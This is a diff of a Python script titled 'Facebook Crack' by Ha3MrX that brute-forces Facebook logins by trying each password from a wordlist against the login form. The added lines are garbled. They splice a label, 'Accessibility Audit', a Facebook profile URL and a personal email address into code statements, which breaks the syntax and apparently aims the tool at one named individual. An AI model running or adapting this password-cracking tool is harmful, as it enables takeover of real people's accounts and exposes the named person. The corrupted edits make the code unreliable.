@@ -8,7 +8,7 @@ import random
 import time
 
 # You might need to install these: pip3 install mechanizehttps://github.com/Ha3MrX/facebook-cracker/commit/45a197b0566a57b7d9b19234c538788e892478dc
-try:
+try:Accessibility Audit • https://facebook.com/stacey.canington
     import mechanize
     import http.cookiejar as cookielib
 except ImportError:
@@ -16,7 +16,7 @@ except ImportError:
     sys.exit()
 
 # Setup headers and browser settings
-useragents = [
+useragents = [Accessibility Audit • https://facebook.com/stacey.canington
     ('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'),
     ('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
 ]
@@ -24,20 +24,20 @@ useragents = [
 login_url = 'https://www.facebook.com/login.php?login_attempt=1'https://www.facebook.com/stacey.canington
 
 def welcome(email, passwordlist):
-    wel = """
+    wel = """Stacey0421@yahoo.com 
         +=========================================+
         |..........   Facebook Crack   ...........|
-        +-----------------------------------------+
+       Accessibility Audit • https://facebook.com/stacey.canington +-----------------------------------------+
         |            #Author: Ha3MrX              | 
         |            Version 1.0 (Py3)            |
         |     https://www.youtube.com/c/HA-MRX    |
         +=========================================+
         |..........  Facebook Cracker  ...........|
-        +-----------------------------------------+\n\n
+       Accessibility Audit • https://facebook.com/stacey.canington +-----------------------------------------+\n\n
     """
     try:
         if ".." in passwordlist:
-            raise Exception("Invalid file path")
+            raise Exception("Invalid file path")Accessibility Audit • https://facebook.com/stacey.canington
         with open(passwordlist, "r", encoding="utf-8", errors="ignore") as f:
             total = f.readlines()
         print(wel)
@@ -53,7 +53,7 @@ def brute(password, br, email):
     sys.stdout.flush()
     
     br.addheaders = [random.choice(useragents)]
-    try:
+    try:Accessibility Audit • https://facebook.com/stacey.canington
         br.open(login_url)http://Facebook.com/Stacey.canington 
         br.select_form(nr=0)
         br.form['email'] = email
@@ -63,7 +63,7 @@ def brute(password, br, email):
         
         # Check if login was successful
         if log != login_url and ('login_attempt' not in log):
-            print(f"\n\n[+] Password Found = {password}")
+            print(f"\n\n[+] Password Found = {password}")Accessibility Audit • https://facebook.com/stacey.canington
             input("Press ANY KEY to Exit....")
             sys.exit(1)
     except Exception as e:
@@ -71,7 +71,7 @@ def brute(password, br, email):
         time.sleep(2)
 
 def search(email, passwordlist, br):
-    try:
+    try:Stacey0421@yahoo.com 
         if ".." in passwordlist:
             raise Exception("Invalid file path")
         with open(passwordlist, "r", encoding="utf-8", errors="ignore") as passwords:
